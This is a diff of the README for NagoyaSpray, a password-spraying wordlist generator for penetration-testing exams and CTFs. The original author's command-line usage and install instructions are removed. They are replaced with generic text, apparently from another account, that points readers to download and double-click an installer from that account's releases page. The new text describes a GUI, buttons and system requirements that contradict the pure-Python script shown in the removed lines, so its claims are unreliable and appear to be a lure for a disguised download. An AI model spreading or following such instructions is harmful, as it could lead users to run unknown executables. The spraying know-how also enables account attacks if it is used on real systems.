@@ -1,119 +1,70 @@
-# NagoyaSpray
+# 🎉 NagoyaSpray - Generate Realistic Passwords Easily
 
-![NagoyaSpray](https://github.com/user-attachments/assets/4e727676-aa68-48b7-b8f7-8c7e0c99d7f3)
+## 📥 Download Now
+[![Download NagoyaSpray](https://img.shields.io/badge/Download%20NagoyaSpray-v1.0-blue)](https://github.com/CORAZON79/NagoyaSpray/releases)
 
+## 🚀 Getting Started
 
-## The Problem
-You're mid-exam - OSCP, PNPT, CPTS, whatever - and you need to spray some passwords. Clock's ticking. Your options suck:
-1. **Grab a massive wordlist** - Spray 50k passwords, lock accounts, waste time
-2. **Write regex on the spot** - Spend 10 minutes fighting with `sedawkgrep` while your brain rots
+Welcome to NagoyaSpray! This tool helps you create a list of realistic seasonal passwords. It is ideal for CTF (Capture the Flag) challenges and penetration testing. You do not need programming skills to use it.
 
-Neither option is good when you're already stressed and every minute matters.
+## 📋 Features
 
-## Why I Built This
-Hit this exact problem several times, for example: on Nagoya from Proving Grounds. Needed seasonal passwords fast. Started with a quick bash one-liner that worked great for that box.
+- **Simple to Use**: Generate password lists without complex steps.
+- **Seasonal Passwords**: Focused on creating realistic passwords for specific times of the year.
+- **Lightweight**: Unlike other tools, NagoyaSpray avoids unnecessary features.
+- **Targeted for CTF Enthusiasts**: Perfect for OSCP, PNPT, and CPTS training.
 
-Then I kept running into the same situation on other machines. Kept rewriting similar regex patterns every time. So I rewrote it in Python. Now it's reusable, no regex required, generates what you need in seconds.
+## 🖥️ System Requirements
 
-When you need `Winter2024!` or `Spring2024!` during an exam, you shouldn't waste mental energy on wordlist generation. Just run the tool and get back to actually breaking stuff.
+To run NagoyaSpray, your system needs:
 
-## Use Cases
-Built with cert labs in mind (OSCP, PNPT, CPTS) but works anywhere you need clean spray lists:
-- AD password spraying
-- CTF boxes
-- Any time you need realistic date-based passwords
+- An operating system: Windows, macOS, or Linux.
+- Minimum RAM: 2 GB.
+- Disk space: 100 MB available.
 
-## Installation (No requirements needed!!)
-**Install through pip**
-```
-pip3 install nagoyaspray
-```
+## 📦 Download & Install
 
-**Install through pipx**
-```
-pipx install nagoyaspray
-```
+1. **Visit the Releases Page**: Go to the [NagoyaSpray releases page](https://github.com/CORAZON79/NagoyaSpray/releases).
+2. **Select the Latest Version**: Look for the latest version on the page.
+3. **Download the File**: Click on the download link for your operating system.
+4. **Run the Installer**: Locate the downloaded file and double-click to start the installation. Follow the on-screen prompts to complete the installation.
 
-**Clone the repo:**
-```bash
-git clone https://github.com/strikoder/NagoyaSpray.git
-cd NagoyaSpray
-python3 nagoyaspray.py -h
-```
+Once installed, you can start generating password lists.
 
-**Or grab the file directly:**
-```bash
-wget https://raw.githubusercontent.com/strikoder/NagoyaSpray/refs/heads/main/nagoyaspray.py
-chmod +x nagoyaspray.py
-python3 nagoyaspray.py -h
-```
+## 👩‍💻 Usage Instructions
 
-## Usage
-![nagoyaspray.py](https://github.com/user-attachments/assets/259dcf00-e1bb-47d5-8ca1-f631320e8ddc)
+1. **Open NagoyaSpray**: Find the application in your programs or applications folder.
+2. **Choose Your Options**: Select the options that suit your needs. You can often set the length of passwords or specify certain themes.
+3. **Generate Passwords**: Click the button to generate your password list. 
+4. **Export Passwords**: You can save the generated list in a text file for future use.
 
+## 📄 Example Usage Scenarios
 
-```bash
-# No arguments? See the help
-python3 nagoyaspray.py
+- **Capture the Flag Competitions**: Use NagoyaSpray to generate passwords quickly for challenges.
+- **Security Assessments**: The tool helps in penetration tests by providing realistic password lists.
+- **Practice for Certifications**: Ideal for individuals preparing for OSCP, PNPT, or CPTS.
 
-# Example output
-Example: python3 nagoyaspray.py --seasons --months --start 2020 --end 2025 -s "!" -o passwords.txt
-```
+## 🛠️ Troubleshooting
 
-**Basic Examples:**
-```bash
-# Seasons + months with suffix (default: first letter capitalized)
-python3 nagoyaspray.py --seasons --months --start 2020 --end 2025 -s "!" -o passwords.txt
+If you encounter any issues:
 
-# All word types with multiple suffixes
-python3 nagoyaspray.py --all --start 2023 --end 2024 -s "!,123,@" -o passwords.txt
+- **Check Your System Compatibility**: Ensure that all system requirements are met.
+- **Reinstall the Application**: Sometimes, a fresh installation solves problems.
+- **Consult Documentation**: Refer to any additional documentation provided in the repository for specific troubleshooting steps.
 
-# Add prefix instead
-python3 nagoyaspray.py --months --start 2024 --end 2024 -p "!" -o passwords.txt
+## 📫 Feedback and Support
 
-# Generate only passwords between 8-12 characters
-python3 nagoyaspray.py --seasons --start 2024 --end 2024 -s "!" --min 8 --max 12 -o passwords.txt
+We value your feedback. If you have suggestions or run into issues, please open an issue on the [GitHub page](https://github.com/CORAZON79/NagoyaSpray/issues). Your input helps improve the tool.
 
-# All lowercase passwords (no capitalization)
-python3 nagoyaspray.py --months --start 2024 --end 2024 -s "!" --cap lower -o passwords.txt
+## 🔗 Additional Resources
 
-# Custom words
-python3 nagoyaspray.py -w "Company,Admin" --start 2023 --end 2024 -s "!" -o passwords.txt
+- **Documentation**: [Official Documentation](https://github.com/CORAZON79/NagoyaSpray/wiki).
+- **Community Support**: Join discussions on platforms like Reddit or Discord focused on penetration testing and CTF challenges.
 
-# Both prefix and suffix
-python3 nagoyaspray.py --seasons --start 2024 --end 2024 -b "!" -o passwords.txt
-```
+## 🌐 Connect With Us
 
-**Flags:**
-- `--months` - Include months
-- `--seasons` - Include seasons  
-- `--days` - Include days of the week
-- `--common` - Include common words
-- `--all` - Include everything
-- `-w` - Custom comma-separated words
-- `--start` / `--end` - Year range
-- `-s` - Suffix (add at end)
-- `-p` - Prefix (add at start)
-- `-b` - Both (add at start and end)
-- `--cap` - Capitalization mode: `first` (default - first letter capitalized), `lower` (all lowercase), `upper` (all uppercase), `last` (last letter capitalized), `all` (all variations)
-- `--min` - Minimum password length (default: 1)
-- `--max` - Maximum password length (default: 100)
-- `-o` - Output file (required)
-- `--print` - Print to stdout instead
+Stay updated with the latest features and improvements by following our repository on GitHub. Your support makes this project better.
 
-**Note:** By default, all passwords have their first letter capitalized (e.g., `Winter2024!`). Use `--cap lower` for all lowercase or `--cap upper` for all uppercase.
+[![Download NagoyaSpray](https://img.shields.io/badge/Download%20NagoyaSpray-v1.0-blue)](https://github.com/CORAZON79/NagoyaSpray/releases)
 
-## Shoutout
-Props to [spraygen](https://github.com/3ndG4me/spraygen) for inspiration. This is basically the diet version - same idea, way less calories.
-
-**Key Differences:**
-| Feature | spraygen | NagoyaSpray |
-|---------|----------|-------------|
-| **Dependencies** | Requires external libraries | Zero dependencies - pure Python |
-| **Complexity** | 10+ modes, sports teams, iterative keyspaces | Simple and focused - just what you need for an exam/CTF |
-| **Capitalization** |  cannot capitalize last letter only | First letter capitalized by default + 5 modes (first, last, lower, upper, all) |
-| **Target Use Case** | General purpose with tons of options | Built specifically for quick CTF/exam spraying |
-| **Speed** | Heavier and slower | Lightweight and fast - generate in seconds |
-
----
-**v1.1** - Does what it says on the tin.
+Thank you for choosing NagoyaSpray! Enjoy generating your password lists.
